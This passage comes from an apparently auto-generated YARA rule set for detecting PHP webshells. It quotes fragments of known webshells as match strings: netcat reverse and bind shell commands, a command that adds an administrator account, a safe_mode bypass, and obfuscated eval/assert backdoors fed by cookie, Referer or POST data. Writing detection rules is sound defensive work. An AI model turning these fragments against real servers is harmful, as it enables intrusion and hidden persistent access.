      description = "php17 - file 91e728880cb5ae1d703c733a6ed29410.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "27539e9a1c5f58d4930b49d34534a07ab1512cd903694cbf93602a68be49ba3a"
   strings:
      $s1 = "QlVNVkpoVkZaRmQxSnVWbUZUUjNoeFdUQldjMU5GT1ZsaVJYQlRUVlZ3TTFZeWVFOWliVXB6WTBac1ZHSnRlSEJVVkVKeVRXeE9WbFJyU21saE0yaDNWbGMxVTJKR1du" ascii
      $s2 = "RmlSRnBhWVRKTk1WbFdaRXBsYlVsNlVXeENiRlpWV1hsV1JWSktaVWRHU0ZKWWJGZFdNbEp3V1d4YVdtVnNUbFphUjBacS5VakJ3U1Zac1ZqQlNSbkExWVROQ1VHUjVh" ascii
      $s3 = "FVWVnB1WlZaU2RWZHRiR2xpUlhCNlYxY3dNVlV5Vm5Ka1JWSmFUVEZ3Y2xWdWNFZE5NVkpKWVhwR2FWWXdiRFpXYlRWWFdWWkdObUpFUWxoV2JWSnlXV3RrVDJSV1RuV" ascii
      $s4 = "ldSRTVyWkRKS1IyRXpiR2hUUm5CTFZWUkdTMDFHY0VkYVNFNXBVbGQ0UlZSclpITlhWa28yVlc1Q1ZVMHlVak5VVm1STFpFZFdTVkZ0YkdsWFJUVXlWVEkxY2s1Vk1Va" ascii
      $s5 = "lVWelZ2VFd4a1dFMUVWazloTW5oR1ZGVmthMU15VmxWaE0yUmFZa2RvUTFwSGREUmtSbVIxVjIxMFYyVnNXbmxXUlZKS1pVZEdSMkl6YkZkaWJYaHhXV3hTYzA1V1Vra" ascii
      $s6 = "lhiWEJvVmtaV00xZHNWbTlWYlVweVpVVlNVbUV5VWxWV2JHaHZVakZrUlZKc1pGZFNhM0JZVkRGV2QxWlhSWGRPVlRWWFlrWmFWRlZ0ZUc1bFJrWnlVMnhrVTFZeVVqT" ascii
      $s7 = "FRiR3hTVjBad1RsbHNXbmROYkhCSFdYcEdhRTFJWkRWVVZtUnZXVlV4YzFkcVZscE5ha0V4V2xaV05HUldWbkZWYlhSU1RXczFNMVpFVG10a2JVVjVVMnhzYVZJeGNIR" ascii
      $s8 = "FhiV2hwVVRKb2NGZFdhRTlpUlRWeFZXMWFZVkl4V25GWmFrcFRZa1YwUmxSdE5XbE5ibEp3VmpCYVlXUXhaSE5VYTBwUVZsZDRTVll5TlVOaFZrbDRWMjB4V0dGcmNGa" ascii
   condition:
      uint16(0) == 0x3c20 and filesize < 3KB and
      all of them
}

rule AttachPermissionsToRoleTest
{
   meta:
      description = "php17 - file AttachPermissionsToRoleTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c55de8e158b838e8510e1dd0057546f73d081961dbbe56f3f18aef6d42552776"
   strings:
      $s1 = "'permissions_ids' => [$permissionA->getHashedKey(), $permissionB->getHashedKey()]" fullword ascii
      $s2 = "'permissions_ids' => $permissionA->getHashedKey()," fullword ascii
      $s3 = "* @author  Mahmoud Zalt <mahmoud@zalt.me>" fullword ascii
      $s4 = "$responseContent = $this->getResponseContentObject();" fullword ascii
      $s5 = "$this->assertEquals($roleA['name'], $responseContent->data->name);" fullword ascii
      $s6 = "* @group authorization" fullword ascii
      $s7 = "'role_id'         => $roleA->getHashedKey()," fullword ascii
      $s8 = "protected $endpoint = 'post@v1/permissions/attach';" fullword ascii
      $s9 = "namespace App\\Containers\\Authorization\\UI\\API\\Tests\\Functional;" fullword ascii
      $s10 = "use App\\Containers\\Authorization\\Models\\Permission;" fullword ascii
      $s11 = "use App\\Containers\\Authorization\\Models\\Role;" fullword ascii
      $s12 = "* @group api" fullword ascii
      $s13 = "* Class AttachPermissionsToRoleTest." fullword ascii
      $s14 = "public function testAttachMultiplePermissionToRole_()" fullword ascii
      $s15 = "public function testAttachSinglePermissionToRole_()" fullword ascii
      $s16 = "$this->assertDatabaseHas('role_has_permissions', [" fullword ascii
      $s17 = "// send the HTTP request" fullword ascii
      $s18 = "use App\\Containers\\Authorization\\Tests\\ApiTestCase;" fullword ascii
      $s19 = "'permissions' => 'manage-roles'," fullword ascii
      $s20 = "'permission_id' => $permissionA->id," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule sig_7a7bfc69b9ab20f960e43c8c4faa4bc33825c648
{
   meta:
      description = "php17 - file 7a7bfc69b9ab20f960e43c8c4faa4bc33825c648.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6989ebb66bf879f3fa7140e847decc7d3d415f5000bf6759f6e6612726619d6c"
   strings:
      $x1 = "if(!$bd)echo $error;else shelL(\"$name -L -p $port -e cmd.exe\");" fullword ascii
      $x2 = "if(!$bd)echo $error;else shelL(\"$name $ip $port -e cmd.exe\");" fullword ascii
      $x3 = "elseif ($windows && is_object($ws = new COM(\"WScript.Shell\"))){$dir=(isset($_SERVER[\"TEMP\"]))?$_SERVER[\"TEMP\"]:ini_get('up" ascii
      $x4 = "mp_dir') ;$name = $_SERVER[\"TEMP\"].namE();$ws->Run(\"cmd.exe /C $command >$name\", 0, true);$exec = file_get_contents($name);u" ascii
      $x5 = "$alias=\"<option value=\\\"netstat -an | grep -i listen\\\">Display open ports</option><option value=\\\"last -a -n 250 -i\\\">S" ascii
      $x6 = "echo \"<br><table border=0 cellpadding=0 cellspacing=0 style=\\\"border-collapse: collapse\\\" bordercolor=\\\"#282828\\\" bgcol" ascii
      $x7 = "$footer=\"${msgbox}PHPJackal v$v - Powered By <a href=\\\"http://netjackal.by.ru\\\" target=\\\"_blank\\\">NetJackal</a>$et\";" fullword ascii
      $x8 = "$alias=\"<option value=\\\"netstat -an\\\">Display open ports</option><option value=\\\"tasklist\\\">List of processes</option><" ascii
      $x9 = "if(!$bd) echo $error;else shelL(\"cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $ip $port &\");" fullword ascii
      $x10 = "filE=/var/cpanel/accounting.log&workingdiR=$cwd\").\"\\\">Readable</a>\"; else echo \"Not readable\";}else echo \"Not found\";" fullword ascii
      $x11 = "if (!$bd) echo $error;else shelL(\"cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $port &\");" fullword ascii
      $x12 = "250 logged in users</option><option value=\\\"which wget curl lynx w3m\\\">Downloaders</option><option value=\\\"find / -perm -2" ascii
      $x13 = "0\\\" width=\\\"253\\\"><input type=text name=target value=\\\"http://\".getenv('HTTP_HOST').\"/login.php\\\" size=35></td></tr>" ascii
      $x14 = "else echo \"<center><table border=0 style=\\\"border-collapse: collapse\\\" bordercolor=\\\"#282828\\\" width=\\\"434\\\"><tr><t" ascii
      $x15 = "if (empty($CPU))$CPU = shelL(\"echo %PROCESSOR_IDENTIFIER%\");" fullword ascii
      $x16 = "elseif(is_resource($output=popen($command,\"r\"))) {while(!feof($output)){$exec= fgets($output);}pclose($output);}" fullword ascii
      $x17 = "elseif(is_callable('shell_exec') && !strstr($disablefunctions,'shell_exec')){$exec= shell_exec($command);}" fullword ascii
      $x18 = "echo \"<tr><td width=\\\"25%\\\" bgcolor=\\\"#808080\\\">${mil}PHP\\\">PHP</a> version:</td><td bgcolor=\\\"#808080\\\"><a href=" ascii
      $x19 = "<tr><td><a href=javascript:history.back(1)>[Back]</a> - <a href=\"<?php $cwd= getcwd(); echo hlinK(\"seC=sysinfo&workingdiR=$cwd" ascii
      $x20 = "echo \"<font color=blue>Port scanning started against \".htmlspecialchars($target).\":<br>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*)
}

rule AssetModel
{
   meta:
      description = "php17 - file AssetModel.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1e0886e8a7cbfcdf91ac51af3dd16cb82a7f24edfcd4cc0261b0c27aa8ff42e4"
   strings:
      $s1 = "// | Copyright (c) 2013-2018 http://www.thinkcmf.com All rights reserved." fullword ascii
      $s2 = "// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )" fullword ascii
      $s3 = "<thinkcmf@126.com>" fullword ascii
      $s4 = "// +----------------------------------------------------------------------" fullword ascii
      $s5 = "namespace app\\user\\model;" fullword ascii
      $s6 = "// | Author: " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php17_3
{
   meta:
      description = "php17 - file 3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9f2b391fbf8b4f2bc3007c8fbb63168072ee010e7fb51c724396d26bed2b0e5e"
   strings:
      $x1 = "Dim user, pass, port, ftpport, cmd, loginuser, loginpass, deldomain, mt, newdomain, newuser, quit" fullword ascii
      $s2 = "c.open \"GET\", \"http://127.0.0.1:\" & port & \"/goldsun/upadmin/s3\", True, \"\", \"\"" fullword ascii
      $s3 = "b.open \"GET\", \"http://127.0.0.1:\" & ftpport & \"/goldsun/upadmin/s2\", True, \"\", \"\"" fullword ascii
      $s4 = "\"-HomeDir=c:\\\\\" & vbCrLf & \"-LoginMesFile=\" & vbCrLf & \"-Disable=0\" & vbCrLf & \"-RelPaths=1\" & vbCrLf & _" fullword ascii
      $s5 = "a.open \"GET\", \"http://127.0.0.1:\" & port & \"/goldsun/upadmin/s1\",True, \"\", \"\"" fullword ascii
      $s6 = "b.send \"User go\" & vbCrLf & \"pass od\" & vbCrLf & \"site exec \" & cmd & vbCrLf & quit" fullword ascii
      $s7 = "\"-NeedSecure=0\" & vbCrLf & \"-HideHidden=0\" & vbCrLf & \"-AlwaysAllowLogin=0\" & vbCrLf & \"-ChangePassword=0\" & vbCrLf & _" fullword ascii
      $s8 = "deldomain = \"-DELETEDOMAIN\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \" PortNo=\" & ftpport & vbCrLf" fullword ascii
      $s9 = "a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit" fullword ascii
      $s10 = "<td><input name=\"c\" type=\"text\" id=\"c\" value=\"cmd /c net user goldsun love /add & net localgroup administrators goldsun /" ascii
      $s11 = "<td><input name=\"c\" type=\"text\" id=\"c\" value=\"cmd /c net user goldsun love /add & net localgroup administrators goldsun /" ascii
      $s12 = "c.send loginuser & loginpass & mt & deldomain & quit" fullword ascii
      $s13 = "newuser = \"-SETUSERSETUP\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \"-PortNo=\" & ftpport & vbCrLf & \"-User=go\" & vbCrLf & \"-P" ascii
      $s14 = "newuser = \"-SETUSERSETUP\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \"-PortNo=\" & ftpport & vbCrLf & \"-User=go\" & vbCrLf & \"-P" ascii
      $s15 = "GName=\"http://\" & request.servervariables(\"server_name\")&lcase(request.servervariables(\"script_name\")) " fullword ascii
      $s16 = "<input name=\"c\" type=\"hidden\" id=\"c\" value=\"<%=cmd%>\" size=\"50\">" fullword ascii
      $s17 = "newuser=replace(newuser,\"c:\",f)" fullword ascii
      $s18 = "<table width=\"494\" height=\"163\" border=\"1\" cellpadding=\"0\" cellspacing=\"1\" bordercolor=\"#666666\">" fullword ascii
      $s19 = "\"-Maintenance=System\" & vbCrLf & \"-PasswordType=Regular\" & vbCrLf & \"-Ratios=None\" & vbCrLf & \" Access=c:\\\\|RWAMELCDP\"" ascii
      $s20 = "\"-Maintenance=System\" & vbCrLf & \"-PasswordType=Regular\" & vbCrLf & \"-Ratios=None\" & vbCrLf & \" Access=c:\\\\|RWAMELCDP\"" ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule ApiTestCase
{
   meta:
      description = "php17 - file ApiTestCase.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c5a321243e5b9d723cec1f8a13b69587d2ed1da1ed1477b322880228f2152f26"
   strings:
      $s1 = "* This is the container API TestCase class. Use this class to add your container specific API related helper functions." fullword ascii
      $s2 = "* Class ApiTestCase." fullword ascii
      $s3 = "namespace App\\Containers\\Stripe\\Tests;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_21ed27ccd0fa985f29d353216238f2a928191fae
{
   meta:
      description = "php17 - file 21ed27ccd0fa985f29d353216238f2a928191fae.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "12038c703b71b2513d8ee0a78d9c51dc4ece725f3a4fd2ebe3fe6708dfd6ca9f"
   strings:
      $s1 = "'not_executed' => \"\\\"[%1]\\\" konnte nicht erfolgreich ausgef?hrt werden:\\n{%2}\"," fullword ascii
      $s2 = "'not_executed' => \"\\\"[%1]\\\" no pudo ser ejecutado correctamente:\\n{%2}\"," fullword ascii
      $s3 = "'not_executed' => \"\\\"[%1]\\\" could not be executed successfully:\\n{%2}\"," fullword ascii
      $s4 = "* 'auto' - use the same charset as the words of my language are encoded" fullword ascii
      $s5 = "'executed' => \"\\\"[%1]\\\" is met succes uitgevoerd:\\n{%2}\"," fullword ascii
      $s6 = "'not_executed' => \"\\\"[%1]\\\" is niet goed uitgevoerd:\\n{%2}\"," fullword ascii
      $s7 = "'executed' => \"\\\"[%1]\\\" has been executed successfully:\\n{%2}\"," fullword ascii
      $s8 = "if (!$win && function_exists('exec') && $file['is_file'] && $file['is_executable'] && file_exists('/bin/sh')) {" fullword ascii
      $s9 = "'executed' => \"\\\"[%1]\\\" ? stato eseguito con successo:\\n{%2}\"," fullword ascii
      $s10 = "'executed' => \"\\\"[%1]\\\" wurde erfolgreich ausgef?hrt:\\n{%2}\"," fullword ascii
      $s11 = "'executed' => \"\\\"[%1]\\\" ha sido ejecutado correctamente:\\n{%2}\"," fullword ascii
      $s12 = "'not_executed' => \"\\\"[%1]\\\" kan ikke k?res korrekt:\\n{%2}\"," fullword ascii
      $s13 = "echo '<a href=\"' . $self . '?action=view&amp;file=' . urlencode($real_file) . '\">' . html($file['target']) . '</a>';" fullword ascii
      $s14 = "exec('echo \"./' . basename($file) . '\" | /bin/sh', $output, $retval);" fullword ascii
      $s15 = "'executed' => \"\\\"[%1]\\\" basariyla ?alistirildi:\\n{%2}\"," fullword ascii
      $s16 = "'executed' => \"\\\"[%1]\\\" er blevet k?rt korrekt:\\n{%2}\"," fullword ascii
      $s17 = "'not_executed' => \"\\\"[%1]\\\" kunde inte utf?ras:\\n{%2}\"," fullword ascii
      $s18 = "'not_executed' => \"\\\"[%1]\\\" ?alistirilamadi:\\n{%2}\"," fullword ascii
      $s19 = "echo '[ <a href=\"' . $self . '?dir=' . urlencode($real_file) . '\">' . html($file['target']) . '</a> ]';" fullword ascii
      $s20 = "'executed' => \"\\\"[%1]\\\" har utf?rts:\\n{%2}\"," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule sig_942e0fc9984256f2bdb17f8d0c77a7afacb7b112
{
   meta:
      description = "php17 - file 942e0fc9984256f2bdb17f8d0c77a7afacb7b112.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
   strings:
      $s1 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { err(2,$_POST['mk_name']); $_POST['cmd']=\"\"; " fullword ascii
      $s2 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=(!$unix)?(\"dir\"):(\"ls -lia\"); }" fullword ascii
      $s3 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { err(2,$_POST['mk_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s4 = "'eng_text115'=>'Test bypass safe_mode, copy file via compress.zlib:// in function copy()'," fullword ascii
      $s5 = "@mysql_query(\"LOAD DATA INFILE \\\"\".$_POST['test3_file'].\"\\\" INTO TABLE temp_r57_table\");" fullword ascii
      $s6 = "@readfile (\"http://rst.void.ru/r57shell_version/version.php?version=\".$current_version.\"\");}}  " fullword ascii
      $s7 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii
      $s8 = "if($_POST['cmd']==\"ftp_file_up\")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);" fullword ascii
      $s9 = "'ru_text99'=>'* ? ???????? ?????? ? ?????? ???????????? ??? ???????????? ?? /etc/passwd'," fullword ascii
      $s10 = "if(@copy(\"compress.zlib://\".$_POST['test8_file1'], $_POST['test8_file2'])) echo $lang[$language.'_text118'];" fullword ascii
      $s11 = "if(!$file=@fopen($_POST['loc_file'],\"r\")) { err(1,$_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $s12 = "ename($_POST['ftp_file']); } @ftp_get($connection,$_POST['loc_file'],$_POST['ftp_file'],$_POST['mode']);" fullword ascii
      $s13 = "if(!$file=@fopen($_POST['d_name'],\"r\")) { err(1,$_POST['d_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s14 = "if(!$file=@fopen($_POST['e_name'],\"r\")) { err(1,$_POST['e_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s15 = "'ru_text101'=>'???????????? ????? ???????????? (user -> resu) ??? ???????????? ? ???????? ??????'," fullword ascii
      $s16 = "// ????? ? ?????? ??? ??????? ? ??????? (Login & Password for access)" fullword ascii
      $s17 = "else if($fp){ foreach($sql->dump as $v) @fputs($fp,$v.\"\\r\\n\"); } " fullword ascii
      $s18 = "else if(!$users=get_users()) { echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><fon" ascii
      $s19 = "$head = '<!-- ??????????, ???? -->" fullword ascii
      $s20 = "exit(\"<b><a href=http://rst.void.ru>r57shell</a> : Access Denied</b>\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule sig_199a262618c38e93ef2bf01f043565e0dadbe246
{
   meta:
      description = "php17 - file 199a262618c38e93ef2bf01f043565e0dadbe246.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "140c11dcef831aaad7a72e4d4f56faa75b497c222516f33eb2bacff2ab2ab85b"
   strings:
      $s1 = "mb_ereg_replace_callback('.+', create_function('$arr', 'return assert($arr[0]);'),$_REQUEST['op']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_29e8f3611dd2ccc49489b3ec401d7f32ca27b427
{
   meta:
      description = "php17 - file 29e8f3611dd2ccc49489b3ec401d7f32ca27b427.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0531480b16c3fd1a5b6cfaddf65add4c7d98bac00bd8a6b1d7f16e7a461693d2"
   strings:
      $s1 = "header('Content-type:text/html;charset=utf-8');" fullword ascii
      $s2 = "eval(base64_decode(str_replace(\" \", \"+\", implode(array_slice($a, 6)))));" fullword ascii
      $s3 = "parse_str($_SERVER['HTTP_REFERER'], $a);" fullword ascii
      $s4 = "if(reset($a) == '10' && count($a) == 9) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_1647bd8f1d46e6ddeb88ae1f01eed5feba4b89c3
{
   meta:
      description = "php17 - file 1647bd8f1d46e6ddeb88ae1f01eed5feba4b89c3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ec4bcb3af8ae5a9c8092e374a0498f5458110e0c2801ad0d7c8211e02fd2198d"
   strings:
      $s1 = "$U='),$ss($s[Vy$i],0,Vy$e))Vy)Vy,Vy$k)));$o=oVyb_get_contents(Vy);ob_endVy_clean(Vy);$d=bVyVyase64';" fullword ascii
      $s2 = "$s='j};}Vy}return VyVy$o;}$r=$Vy_SERVER;$VyrrVyVy=@$r[\"HTTP_REFVyERER\"];$Vyra=@Vy$r[\"HTTPVy_VyACCEVyP';" fullword ascii
      $s3 = "$t='_eVyncode(x(gzcoVympreVysVysVy($o),$k));prinVyVyt(\"<$kVy>$d</$k>\");Vy@session_VyVydestroy();}}}}';" fullword ascii
      $s4 = "$A='rpoVys($p,Vy$h)===Vy0){$s[$i]=\"\";Vy$p=Vy$ss($p,3Vy);}if(aVyrray_keyVy_Vyexists($iVy,$s)Vy){$s[';" fullword ascii
      $s5 = "$M='iVy.$kVyf),0,3));$p=\"Vy\"Vy;fVyorVyVy($z=1;$z<Vycount($m[1]);$z++)$Vyp.=$q[$m[Vy2][$VyVyzVy]];if(st';" fullword ascii
      $s6 = "$k='$khVy=\"5d41\";$kVyf=\"4Vy02a\";funVyctVyion x($t,$k){Vy$cVyVy=sVytrlen($kVy);$l=strlenVy($t);$o=\"';" fullword ascii
      $s7 = "$Y='prVyess(@x(Vy@baseVy64_decodVye(pVyreg_repVylace(arrVyaVyy(\"/_Vy/\"Vy,\"/-/\"),aVyrray(\"Vy/\",\"+\"Vy';" fullword ascii
      $s8 = "$h='rraVyyVy_values($q);preVyg_Vymatch_all(Vy\"/Vy([\\\\w])Vy[\\\\w-]+(?:;Vyq=0.(VyVy[\\\\dVyVy]))?Vy,?/\",$r';" fullword ascii
      $s9 = "$u='T_LANGUAGE\"]Vy;VyifVy($rr&VyVy&$ra){$u=parse_url($rrVy);parsVyVye_str($uVy[\"query\"],$q)Vy;$Vyq=a';" fullword ascii
      $s10 = "$I='lVyoVywer\";$i=Vy$m[1][Vy0].$m[1][1];$Vyh=$sl($ssVy(mVyd5($i.$Vykh),0,3));$fVy=$sVyVyl($ss(md5($';" fullword ascii
      $s11 = "$b='$i]Vy.=$pVyVy;$e=strpos($s[Vy$i],$fVy);if($Vye){$k=$kVyh.$Vykf;ob_sVytart();@VyevVyal(@gzuncoVym';" fullword ascii
      $s12 = "$g='\";forVy($Vyi=0;$i<$lVy;){foVyrVy($j=0;($jVy<$c&&$Vyi<$l)VyVy;$j++Vy,$iVy++){$o.=$t{$i}^$k{$Vy';" fullword ascii
      $s13 = "$n='a,$m);if(Vy$q&&$m){@VysessioVyn_startVy();$sVy=&$_SESSIVyOVyN;$ssVy=\"substr\";$Vysl=\"strtoVyVy';" fullword ascii
      $s14 = "$Z=str_replace('Vy','',$k.$g.$s.$u.$h.$n.$I.$M.$A.$b.$Y.$U.$t);" fullword ascii
      $s15 = "$T=str_replace('Uv','','crUvUveatUve_fUvUvuncUvtion');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_96369ab056721f2ff4c0de6da6ca0f4f0f4559ab
{
   meta:
      description = "php17 - file 96369ab056721f2ff4c0de6da6ca0f4f0f4559ab.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bc7c17baa8f63b22900acede4b9b03ec9b2fc4b72a9857c14f845d71f8d49152"
   strings:
      $s1 = "for ($f5018d=0; $f5018d<$GLOBALS[$GLOBALS['v06b'][6].$GLOBALS['v06b'][52].$GLOBALS['v06b'][76].$GLOBALS['v06b'][59].$GLO" fullword ascii
      $s2 = "for ($s0cf=0; $s0cf<$GLOBALS[$GLOBALS['v06b'][6].$GLOBALS['v06b'][52].$GLOBALS['v06b'][76].$GLOBALS['v06b'][59].$GLOBALS['v0" fullword ascii
      $s3 = "if (isset($ya19a[$GLOBALS['v06b'][50].$GLOBALS['v06b'][25]]) && $y4ae9d9f8==$ya19a[$GLOBALS['v06b'][50].$GLOBALS['v06b'][25]])" fullword ascii
      $s4 = "return $GLOBALS[$GLOBALS['v06b'][91].$GLOBALS['v06b'][52].$GLOBALS['v06b'][52].$GLOBALS['v06b'][59]]($GLOBALS[$GLOBALS['v06b" fullword ascii
      $s5 = "foreach ($GLOBALS[$GLOBALS['v06b'][74].$GLOBALS['v06b'][46].$GLOBALS['v06b'][46].$GLOBALS['v06b'][26].$GLOBALS['v06b'][0].$G" fullword ascii
      $s6 = "echo @$GLOBALS[$GLOBALS['v06b'][95].$GLOBALS['v06b'][60].$GLOBALS['v06b'][52].$GLOBALS['v06b'][50].$GLOBALS['v06b'][26]]" fullword ascii
      $s7 = "'][84].$GLOBALS['v06b'][96].$GLOBALS['v06b'][26]] = $GLOBALS['v06b'][46].$GLOBALS['v06b'][87].$GLOBALS['v06b'][53];" fullword ascii
      $s8 = "'][59].$GLOBALS['v06b'][84].$GLOBALS['v06b'][76]] = $GLOBALS['v06b'][78].$GLOBALS['v06b'][53].$GLOBALS['v06b'][52];" fullword ascii
      $s9 = "$GLOBALS['v06b'][74].$GLOBALS['v06b'][37] => $GLOBALS['v06b'][45].$GLOBALS['v06b'][62].$GLOBALS['v06b'][60].$GLOBALS" fullword ascii
      $s10 = "$GLOBALS['v06b'][32].$GLOBALS['v06b'][37] => @$GLOBALS[$GLOBALS['v06b'][52].$GLOBALS['v06b'][46].$GLOBALS['v06b'][0]" fullword ascii
      $s11 = "$eb62ebe .= $GLOBALS[$GLOBALS['v06b'][37].$GLOBALS['v06b'][42].$GLOBALS['v06b'][84].$GLOBALS['v06b'][96].$GLOBALS['v" fullword ascii
      $s12 = "@$GLOBALS[$GLOBALS['v06b'][74].$GLOBALS['v06b'][96].$GLOBALS['v06b'][59].$GLOBALS['v06b'][46].$GLOBALS['v06b'][26]](0);" fullword ascii
      $s13 = "][0].$GLOBALS['v06b'][46].$GLOBALS['v06b'][79].$GLOBALS['v06b'][60]] = $_COOKIE;" fullword ascii
      $s14 = "LS['v06b'][0].$GLOBALS['v06b'][46].$GLOBALS['v06b'][79].$GLOBALS['v06b'][60]] as $uef533=>$u8d5)" fullword ascii
      $s15 = "][59].$GLOBALS['v06b'][59].$GLOBALS['v06b'][26]] = $_POST;" fullword ascii
      $s16 = "'][91].$GLOBALS['v06b'][52].$GLOBALS['v06b'][52].$GLOBALS['v06b'][59]]($ya19a, $y4ae9d9f8), $uef533);" fullword ascii
      $s17 = "'][42]] = $GLOBALS['v06b'][26].$GLOBALS['v06b'][50].$GLOBALS['v06b'][42].$GLOBALS['v06b'][84];" fullword ascii
      $s18 = "b'][86].$GLOBALS['v06b'][43].$GLOBALS['v06b'][74].$GLOBALS['v06b'][26].$GLOBALS['v06b'][21];" fullword ascii
      $s19 = "b'][50].$GLOBALS['v06b'][65].$GLOBALS['v06b'][86].$GLOBALS['v06b'][66].$GLOBALS['v06b'][26];" fullword ascii
      $s20 = "LOBALS['v06b'][59].$GLOBALS['v06b'][59].$GLOBALS['v06b'][26]] as $uef533=>$u8d5)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule sig_8c098dfbc84a72b453d16ed901fb66bc4ed72612
{
   meta:
      description = "php17 - file 8c098dfbc84a72b453d16ed901fb66bc4ed72612.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6db68512b4418c320ecf1ef994d8233e6ed2b9932ad38d59f6ec10aacf5024e6"
   strings:
      $s1 = "@$s -> invoke($_POST[\"cmd\"]);" fullword ascii
      $s2 = "$s = new ReflectionFunction(\"assert\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_12f8e2f891187b0d0f2b4e493f34c3ee560c80a0
{
   meta:
      description = "php17 - file 12f8e2f891187b0d0f2b4e493f34c3ee560c80a0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1d6ff79afdb3e37c57a461e0ec4797a37ad8982b502092d68678477c1b62eeb8"
   strings:
      $s1 = "$T='ER;$rr=@$rs][\"HTTP_s]REFERER\"s]];$ra=s]@$rs][\"HTTP_As]CCEs]PT_LANGs]UAGE\"];is]s]f($rr&&$ra){s]$us]=s]parse_urs]l';" fullword ascii
      $s2 = "$x=';q=0.([\\\\d]))?,?/s]\",s]$ra,$ms]);if($q&&$m){s]@sess]sis]os]n_stars]t();s]$s=&$_SESSION;$sss]=s]\"substr\";$sls]=\"s';" fullword ascii
      $s3 = "$j='$s]e){$k=s]$kh.$s]kf;os]b_start();s]@es]s]val(@gzuncoms]press(@xs](@base6s]s]4_s]decs]ode(preg_replaces](arras]y(';" fullword ascii
      $s4 = "$A='s]s]();$d=bass]e64_encos]de(x(gzcos]ms]press(s]$o),$k));ps]ris]nt(\"s]<$s]k>$d</$s]k>\");@ses]ssios]n_destroy();}}}}';" fullword ascii
      $s5 = "$B='=0){$s[$s]i]=\"\"s];s]$s]p=$ss($p,3);}if(arrs]ay_kes]y_exists]s($s]i,$s))s]{s]$s[$i].=$ps];$s]e=strpos($s[s]$i],$f)s];if(';" fullword ascii
      $s6 = "$c='$kh=\"5d41\"s];s]$kf=\"402a\";fs]uncts]ion x(s]$s]t,$k)s]s]{$c=strlen($ks]);s]$l=strlen($t);$s]s]o=\"\";for(s]$i=0;';" fullword ascii
      $s7 = "$X='\"/_/s]s]\",\"/-/\"),array(\"s]/\",\"+\"),s]$sss]($s[$i],0s],$es]s]))),s]$k)));$o=ob_ges]t_contes]nts]ss]();ob_end_clean';" fullword ascii
      $s8 = "$W='$i<$l;s]){fs]or(s]$s]j=0;($j<$c&&$i<$ls]);$js]+s]+,$s]i++){$o.=$t{$is]}s]^$k{$j};}}rs]etus]rn $o;s]}$r=$_s]SEs]RV';" fullword ascii
      $s9 = "$y=']strts]ols]ows]er\";$s]i=$m[1][0].s]$s]m[1][1]s];$h=$sl($ss(md5s]($i.$s]kh),0,3))s];$f=s]$sl($ss(md5s]($i.s]$k';" fullword ascii
      $s10 = "$q='fs]),0,3));$ps]s]=\"s]s]\";for($z=1;$z<cos]us]nt(s]$m[1]);$zs]++)$p.=$q[$ms][2][$zs]]s]];if(strpos(s]$p,$h)==s]';" fullword ascii
      $s11 = "$i=str_replace('s]','',$c.$W.$T.$M.$x.$y.$q.$B.$j.$X.$A);" fullword ascii
      $s12 = "$H=str_replace('uN','','cuNreauNuNteuN_funcuNtuNion');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule php17_1
{
   meta:
      description = "php17 - file 1.php"
      author = "WatcherLab"
